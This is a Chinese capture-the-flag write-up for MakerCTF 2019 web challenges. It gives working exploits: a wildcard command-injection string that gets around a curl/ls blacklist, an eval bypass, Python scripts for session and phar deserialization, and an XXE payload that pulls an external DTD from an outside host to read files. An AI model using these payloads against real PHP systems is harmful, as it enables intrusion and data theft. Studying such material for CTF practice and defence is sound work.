---
title: MakerCTF 2019 部分Web题目 Writeup
tags: 
    - Writeup
    - CTF
date: 2019/4/15
---

## Pineapple

通过扫描可以发现存在git源码泄露，进一步发现index.php中存在反序列化点:

```php
$info = @$_GET['info'];
$lyric = @$_GET['lyric']; // php://input
if(isset($lyric)&&(@file_get_contents($lyric,'r')==="I want to eat pineapple")){
    unserialize($info);
}
```

及工具类Blog:

```php
class Blog{
    public $file="Music";
    public function __destruct(){
        $blacklist = ["\"", "ls", "curl", "-"];
        // PATH中存在的文件名基本都ban了

        foreach ($blacklist as $key => $value) {
            if(stripos($this->file,$value)){
                die("Attack!");
            }
         }
        system("php ./templates/$this->file.php");
    }
}
```

且提示了flag存在于templates/Secrets.php文件中  
显而易见，Blog类system函数的调用中存在命令拼接，而shell中的通配符可以帮助我们绕过waf  
所以令 `Blog->file = ";/???/???\t./templates/Secrets";` 即可

## Regex and PHP are the best

```php
<?php
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {
    eval($_GET['code']);
} else {
    show_source(__FILE__);
}
```

网上能搜到原题，此处总结一下各种可能能利用的函数

1. `getallheaders()` (在5.5.7之前只存在于apache php模块中)
1. `get_defined_vars()`
1. `session_id(session_start())`

还存在一个比较刁钻的payload:  
 `readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))))`

## can u see the flag

首先通过extract变量覆盖读phpinfo：`func=extract&func_0=phpinfo`
可以发现php版本为7.0.33

回到变量覆盖，发现实际上无法直接进行反序列化，遂回到phpinfo继续寻找突破口

> 其实此时可以通过fuzz找出可以接收一个数组作为参数的函数发现session反序列化

```ini
session.serialize_handler = php_serialize
session.upload_progress.enabled = On
session.upload_progress.cleanup = Off
```

可以发现上述配置项允许我们通过session注入进行反序列化
再次回到变量覆盖，将`func_0`覆盖为`session_start`。  
此时，要进行反序列化还需要更改`serialize_handler`，观察php文档发现session_start可以接受一个`$opts`参数更改session相关配置。之后就是烦人的套娃了

所以第一关的exploit如下：

```python
from phpserialize import serialize
from requests import session

ses = session()
host = 1
class maker_r:
    class maker_e:
        class maker_w:
            class maker_q:
                class get_flag:
                    get1 = 'get_flag::flag1'
                    protected_get2 = '\\f1a9'
                q1 = get_flag()
                private_q2 = None
            w1 = maker_q()
            private_w2 = None
        e1 = maker_w()
        private_e2 = None
    r1 = None
    r2 = maker_e()

payload = serialize(maker_r())

ses.get(host + '/welcome.php', params={
    'func': 'extract', 'func_0': 'session_start'
})

ses.post(host + '/welcome.php', params={
    'func': 'extract', 'func_0': 'session_start'
}, files={'a': 'b'}, data={
    'PHP_SESSION_UPLOAD_PROGRESS': '|' + payload
})
# 此时session文件中的内容为：https://paste.ubuntu.com/p/QBsH3gyx8q/，挺有趣的

ret = ses.post(host + '/welcome.php', params={
    'func': 'extract',
    'func_0': 'session_start'
}, data={
    'serialize_handler': 'php',
    's': 'something'
}).text
print(ret)
```

根据第一关的答案，我们能拿到第二关的源码，并且知道了第二关flag的位置。在classes.php中我们发现有两个key，其中admin_key没有给出，而出题人提示两个key的生成方式如下：

```php
class Secret {
    public $maker_key;
    public $admin_key;

    function __construct() {
        $this->admin_key = $this->gen_secret();
        $this->maker_key = $this->gen_secret(10); // )l)h3X3Gye
    }
    function gen_secret($len = 8) {
        $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()';
        $passwd = '';
        for ($i = 0; $i < $len; $i++ )
            $passwd .= substr($chars, mt_rand(0, strlen($chars) - 1), 1);
        return $passwd;
    }
}
```

`mt_rand`随机数生成器非密码学安全  
可以利用工具（比如php_mt_seed）爆破出seed，得到`admin_key = "!XPiScRy"`  
观察两个key的区别，我们能够发现maker_key只能将已经存在的`maker.gif`移动到`/var/www/data`目录下，且无法获得生成的文件名，而admin_key不仅可以访问/写入任意文件**内容**，还能获得生成的文件名  
所以这个文件名有什么用呢？不能直接访问（不在web目录下），而我们能控制的能访问到本地文件的只有那个`file_get_contents`，这时我们就能联想到phar反序列化了  

> 有一个需要注意的点是file_get_contents的url第一个字符不能为p，此时我们可以通过套娃套一个stream即可，比如压缩流

所以现在要反序列化什么类呢？如果只是要反序列化php自带的类的话那用第一关的反序列化点就行了，没必要再来一个，所以我们的目标缩小到classes中有的类。  
这时我们能发现Move类能够调用任意类的任意函数，参数都没有任何限制，极大地扩展了攻击面。后面就随便搞了。

比如可以利用XXE读flag

```php
<?php
class Move {
    function __construct() {
        $d = <<<str
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [ <!ENTITY % pe SYSTEM "https://files.frankli.site/xxe/xxe.dtd"> %pe; %param1; ]>
<foo></foo>
&external;
str;
        $this->n = array($d, LIBXML_NOENT);
        $this->m = "SimpleXMLElement";
        $this->k = "!XPiScRy";
    }
}

$x = new Phar("payload.phar.gif");
$x->startBuffering();
$x->setStub("GIF89a <?php __HALT_COMPILER();?>");
$x->setMetadata(new Move());
$x->addFromString('a', 'b');
$x->stopBuffering();
```

exploit:

```python
import requests
import base64

with open('payload.phar.gif', 'rb') as f:
    payload = base64.b64encode(f.read()).decode()

def access(n):
    return requests.post('http://localhost/maker.php', params={
        'who': 'maker', 'do': 'move', 'url': n
    }, data={'key': '!XPiScRy'})

ret1 = access('data:text/plain;base64,' + payload).text
filename = __import__('re').findall('[a-zA-Z0-9]*.gif', ret1)[1]
print(access('compress.zlib://phar:///var/www/maker/' + filename).text)
```
